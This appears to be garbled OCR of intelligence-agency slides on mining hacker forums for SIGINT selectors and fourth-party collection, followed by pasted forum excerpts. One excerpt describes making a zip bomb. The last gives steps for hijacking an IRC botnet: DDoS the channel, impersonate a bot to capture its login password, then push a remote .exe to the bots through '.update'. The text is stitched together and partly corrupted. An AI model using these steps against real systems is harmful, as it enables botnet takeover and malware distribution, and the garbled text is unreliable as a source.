Traditional OSINT

• Traditional OSINT is mostly from main
stream news, compiled summaries, and
information put out by venders.

-	Good for situational awareness

-	Some excellent analysis on attacks and
exploits

-	Information can be days or weeks old

-	Doesn’t normally contain strong selectors

Research Objectives

• To compile OSINT information that
enables CNO operations & analysis

-	Emerging threats

-	Situational awareness

-	Identification of the following:

•	Victims	• Capabilities

•	Adversaries • Infrastructure

Research Objectives

• To identify strong selectors and unique
strings from OSINT that can be used
within SIGINT:

-To build XKEYSCORE Fingerprints to identify
the an adversaries capabilities being used
within SIGINT Collection

- To identify and task adversaries and their
infrastructure within SIGINT

-To identify victims for 4th Party Collection

• A clever way to collect OSINT information
from Hacker Forums

- RSS Feeds

•	Automated collection of new and historical posts

•	Allows quicker analysis of posts

•	Leaves no tracks on the forum unlike AIRGAP

•	If enabled, can also get feeds from closed (login
required) forums.

•	Enables analyst to prioritize other sites without

RSS feeds for other access operations

Create a Zip Bomb - Zip of Death

Posted by X.E.R.O

A zip bomb, also known as a Zip of Death, is a malicious archive file designed to crash or
render useless the program or system reading it. It is often used by virus writers to
disable antivirus software, so that a more traditional virus sent afterwards could get into
system undetected. A zip bomb is usually a small file (up to a few hundred kilobytes) for
ease of transport and to avoid suspicion. However, when the file is unpacked its contents
are more than the system can handle. You can make your own zip bomb to annoy your
friends or just out of curiosity (or wilderness) to experiment with it. Make sure you don't
detonate it on yourself.

You need 10 be operator to set the topic. Default password is /oper foo bar; blit if they have changed it, DDoS attack it with your bots
and make sure that you are the first to join!

if you happen to get into a channel with a ton of bots, and the op isnt there, change your nick to a bot's name, or similar, and wait.
They should type like .login <password>
thats when you do the same! haha.
type .login <password>

then .update http://www.somehost.CQni/YOurfilc.cxe
